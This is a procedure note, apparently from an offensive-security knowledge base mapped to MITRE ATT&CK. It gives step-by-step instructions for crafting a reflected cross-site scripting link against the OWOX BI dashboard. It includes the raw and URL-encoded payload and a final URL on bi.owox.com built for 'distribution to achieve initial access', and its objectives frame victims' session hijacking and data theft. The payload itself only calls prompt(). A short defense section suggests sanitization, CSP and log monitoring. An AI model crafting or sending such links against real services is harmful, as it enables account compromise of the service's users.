---
id: proc-uuid-1
tags:
  - xss
  - url-injection
  - payload-crafting
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T00:11:09.670Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-URL-with-XSS-Payload

## Summary

This procedure involves constructing a malicious URL for the OWOX BI dashboard by injecting a URL-encoded XSS payload into the path segment, exploiting the lack of server-side sanitization to reflect arbitrary JavaScript.

## Description

In the OWOX BI application, the dashboard URL path (e.g., /ui/{id}/dashboard/) does not properly filter or escape user-supplied input in the ID segment. By appending an encoded payload like `<img src=xss onerror=prompt('XSS')>`, the attacker creates a link that, when visited and loaded after login, executes the JavaScript in the victim's browser. This targets any user with dashboard access, leading to potential session hijacking or data exfiltration. Prerequisites include knowledge of the target URL structure and basic URL encoding skills.

## Requirements

1. Access to a valid dashboard ID (e.g., from reconnaissance or known paths)
2. URL encoding tool or manual knowledge (e.g., %3C for <)
3. No authentication needed for crafting

## Defense

Defensive measures and detection strategies:

- Implement server-side input validation and sanitization for URL paths, escaping HTML/JS characters
- Use Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous URL patterns in access logs

## Objectives

1. Create a functional malicious URL that embeds the XSS payload
2. Ensure the payload survives URL parsing and reflection
3. Prepare for distribution to achieve initial access

## Instructions

### Step 1: Identify Base URL and ID

**Context**: Start with a legitimate dashboard URL to obtain the path structure and a sample ID.

Base URL example: `https://bi.owox.com/ui/6177527534dc114eb07fa829e4ce4d28/dashboard/?trial=activated`

### Step 2: Encode XSS Payload

**Context**: Convert the raw payload to URL-safe format to avoid breaking the URL.

Raw payload: `<img src=xss onerror=prompt('XSS')>`

Encoded: `%3Cimg%20src=xss%20onerror=prompt('XSS')%3E`

### Step 3: Append to Path

**Context**: Insert the encoded payload directly after the ID in the path segment.

Final URL: `https://bi.owox.com/ui/6177527534dc114eb07fa829e4ce4d28%3Cimg%20src=xss%20onerror=prompt('XSS')%3E/dashboard/?trial=activated`

**Expected Output**: The URL should parse correctly in a browser without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[url-injection]]
